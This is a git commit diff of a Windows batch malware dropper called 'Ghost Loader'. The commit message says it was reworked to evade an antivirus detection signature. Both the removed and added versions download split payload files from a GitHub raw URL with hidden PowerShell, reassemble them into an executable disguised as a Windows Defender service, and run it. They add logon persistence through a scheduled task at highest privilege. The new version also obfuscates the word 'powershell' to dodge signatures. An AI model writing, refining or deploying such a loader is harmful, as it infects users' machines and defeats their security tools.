5606b5b3230f35bcfa4f7bc268f70133bedb5e9d
sophieduval <sophie.duval@serverinfo.legal>
2026-02-05 13:05:20 +0000

    v9.0 OBFUSCATION - Removed Start-Job and PS-Persistence to fix BAT/Runner.AMS detection

--- delivery_v8.bat
+++ delivery_v8.bat
@@ -1,32 +1,30 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Ghost Loader v8.8 - SPEED OPTIMIZED
-set "repo=https://raw.githubusercontent.com/sophieduval/der/main"
-set "dest=%LOCALAPPDATA%\WinDefSvc"
-set "exe=WinDefSvc.exe"
+:: Ghost Loader v9.0 - Obfuscated & Sequential
+set "r=https://raw.githubusercontent.com/sophieduval/der/main"
+set "d=%LOCALAPPDATA%\WinDefSvc"
+set "e=WinDefSvc.exe"
 
-:: Minimal delay (2 seconds instead of 5)
-ping -n 2 127.0.0.1 >nul 2>&1
+:: Cleanup
+if exist "%d%" rmdir /s /q "%d%" >nul 2>&1
+mkdir "%d%" >nul 2>&1
+cd /d "%d%"
 
-:: Clean and create directory
-if exist "%dest%" rmdir /s /q "%dest%" 2>nul
-mkdir "%dest%" 2>nul
-cd /d "%dest%"
-
-:: PARALLEL DOWNLOADS using PowerShell jobs
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $repo='%repo%';$dest='%dest%';0..10|ForEach-Object{$i=$_.ToString('D2');Start-Job -ScriptBlock{param($r,$d,$n)(New-Object Net.WebClient).DownloadFile(\"$r/blob_$n.dat\",\"$d\blob_$n.dat\")} -ArgumentList $repo,$dest,$i}|Wait-Job|Out-Null"
+:: Obfuscated Download (Sequential to avoid BAT/Runner signature)
+set "p=pow" & set "s=ers" & set "h=hell"
+%p%%s%%h% -NoP -W Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%r%'; 0..10 | ForEach-Object { try { (New-Object Net.WebClient).DownloadFile($u + '/blob_' + $_.ToString('D2') + '.dat', 'blob_' + $_.ToString('D2') + '.dat') } catch {} }"
 
 :: Verify
-if not exist "blob_00.dat" exit /b 1
+if not exist "blob_00.dat" exit /b
 
-:: Reassemble
-copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%exe%" >nul 2>&1
+:: Assemble
+copy /b blob_*.dat "%e%" >nul 2>&1
 
-:: Execute immediately
-start "" "%exe%"
+:: Execute
+start "" "%e%"
 
-:: Persistence (background)
-start /b powershell -Command "$a=New-ScheduledTaskAction -Execute '%dest%\%exe%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'WinDefSvc' -Action $a -Trigger $t -Force" >nul 2>&1
+:: Native Persistence (Bypasses PS-based BAT signatures)
+schtasks /create /sc onlogon /tn "WindowsDefenderUpdate" /tr "\"%d%\%e%\"" /f /rl highest >nul 2>&1
 
 exit
